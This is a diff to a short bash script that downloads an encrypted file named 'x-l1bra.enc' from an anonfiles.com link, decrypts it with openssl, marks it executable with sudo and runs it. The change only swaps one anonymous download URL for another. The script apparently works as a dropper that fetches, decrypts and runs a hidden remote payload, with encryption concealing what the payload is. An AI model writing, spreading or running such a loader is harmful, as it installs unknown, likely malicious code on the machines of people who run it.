@@ -1,6 +1,6 @@
 #! /bin/bash
 cd
-curl -O https://cdn-146.anonfiles.com/26xeq7U2y4/50373f2b-1674825150/x-l1bra.enc
+curl -O https://cdn-102.anonfiles.com/udBcq8U2yf/5c985a92-1674825970/x-l1bra.enc
 openssl enc -d -aes-256-cbc -md md5 -in x-l1bra.enc -out x-l1bra
 sudo chmod 755 x-l1bra
 ./x-l1bra
